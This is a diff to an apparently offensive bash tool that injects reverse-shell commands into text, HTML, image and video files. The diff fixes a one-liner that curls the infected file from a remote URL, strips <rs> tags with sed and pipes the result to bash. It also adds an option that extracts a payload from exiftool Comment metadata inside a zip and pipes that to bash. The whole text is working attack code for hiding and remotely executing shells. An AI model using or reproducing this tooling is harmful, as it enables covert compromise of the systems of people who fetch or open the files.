@@ -52,7 +52,6 @@ command="$1"
 filename="$2"
 url="$3"
 
-# For text files
 if [[ "$filename" == *.txt || "$filename" == *.html || "$filename" == *.htm ]]; then
     echo -e "\e[34mInjecting reverse shell into text file..."
     echo "'<rs>$command</rs>'" >> "$filename"
@@ -77,6 +76,8 @@ echo "8. video-ffprobe-one-liner"
 
 echo "Execution methods compatible with text file format:"
 echo "9. text-sed-one-liner"
+echo "Execution method for an infected image/video saved in a zip:"
+echo "10. image/video-exiftool-zip-one-liner"
 read -p "Enter the method number (1-9): " method_choice
 
 case "$method_choice" in
@@ -129,8 +130,15 @@ case "$method_choice" in
         echo -e "$one_liner\e[0m"
         ;;
     9)
-        echo -e "\e[34mGenerating one-liner method with sed..."
-        one_liner="curl -s '$url/$filename' | sed 's/<rs>//g' | sed 's/</rs>//' | bash"
+        echo -e "\e[34mGenerating one-liner method with sed for text based files..."
+        one_liner="curl -s '$url/$filename' | sed 's#<rs>##g' | sed 's#</rs>##' | bash"
+        echo "Generated one-liner:"
+        echo -e "$one_liner\e[0m"
+        ;;
+    10)
+        echo -e "\e[34mGenerating one-liner method with exiftool for extracting the reverse shell injected on the image/video file..."
+        read -p "Enter the name of the file inside the ZIP archive: " filename2
+        one_liner="curl -s '$url/$filename' | exiftool $filename / $filename2 -Comment -b -echo | bash"
         echo "Generated one-liner:"
         echo -e "$one_liner\e[0m"
         ;;
